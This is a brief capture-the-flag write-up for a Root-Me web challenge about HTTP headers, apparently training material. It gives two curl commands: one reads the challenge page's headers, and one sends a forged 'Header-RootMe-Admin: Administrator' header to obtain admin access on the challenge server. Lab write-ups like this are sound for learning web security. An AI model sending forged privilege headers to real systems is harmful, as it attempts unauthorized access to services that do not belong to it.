# Overview
From the challenge name, we assume that it has something to do with the headers.

# Analysis
To get the headers of the web page, we can use a curl command:
curl --head http://challenge01.root-me.org/web-serveur/ch5/

# Attack Execution
Now we know what the headers are, we can change them using the curl command:
curl --include --header "Header-RootMe-Admin: Administrator" http://challenge01.root-me.org/web-serveur/ch5/
